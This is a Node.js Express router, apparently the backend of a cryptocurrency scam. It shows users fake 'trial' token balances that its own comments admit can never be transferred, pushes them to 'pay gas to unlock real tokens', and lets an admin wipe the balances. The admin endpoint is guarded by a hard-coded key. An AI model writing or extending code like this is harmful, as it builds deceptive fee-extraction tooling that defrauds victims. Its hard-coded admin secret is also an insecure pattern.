const express = require('express');
const router = express.Router();
const { pool } = require('../config/database');

// Get user's trial balance (fake balance display)
router.get('/trial-balance/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    const client = await pool.connect();
    try {
      // Get trial balance and check if expired
      const result = await client.query(`
        SELECT token_symbol, balance, expires_at, created_at
        FROM trial_balances 
        WHERE user_address = $1 AND expires_at > NOW()
      `, [address.toLowerCase()]);
      
      const balances = result.rows.map(row => ({
        symbol: row.token_symbol,
        balance: row.balance,
        expiresAt: row.expires_at,
        timeRemaining: Math.max(0, Math.floor((new Date(row.expires_at) - new Date()) / 1000)),
        canTransfer: false, // Always false - cannot send/withdraw
        isTrial: true
      }));
      
      res.json({
        success: true,
        trialBalances: balances,
        warning: balances.length > 0 ? 'Trial tokens cannot be transferred or withdrawn. Pay gas to unlock real tokens.' : null
      });
    } finally {
      client.release();
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Check if user can transfer (always returns false for trial tokens)
router.post('/can-transfer', async (req, res) => {
  try {
    const { userAddress, tokenSymbol, amount } = req.body;
    
    const client = await pool.connect();
    try {
      const result = await client.query(`
        SELECT balance, expires_at
        FROM trial_balances 
        WHERE user_address = $1 AND token_symbol = $2 AND expires_at > NOW()
      `, [userAddress.toLowerCase(), tokenSymbol]);
      
      if (result.rows.length === 0) {
        return res.json({
          canTransfer: false,
          reason: 'No trial balance found or expired'
        });
      }
      
      // Trial tokens can never be transferred
      res.json({
        canTransfer: false,
        reason: 'Trial tokens are locked. Pay gas fees to unlock real transferable tokens.',
        trialBalance: result.rows[0].balance,
        timeRemaining: Math.max(0, Math.floor((new Date(result.rows[0].expires_at) - new Date()) / 1000))
      });
    } finally {
      client.release();
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Expire trial tokens manually (admin only)
router.post('/expire-trial', async (req, res) => {
  try {
    const { userAddress, adminKey } = req.body;
    
    // Simple admin verification
    if (adminKey !== 'crypto-recover-admin-2024') {
      return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const client = await pool.connect();
    try {
      await client.query(`
        UPDATE trial_balances 
        SET balance = '0.0', expires_at = NOW() 
        WHERE user_address = $1
      `, [userAddress.toLowerCase()]);
      
      res.json({
        success: true,
        message: 'Trial tokens expired for user'
      });
    } finally {
      client.release();
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;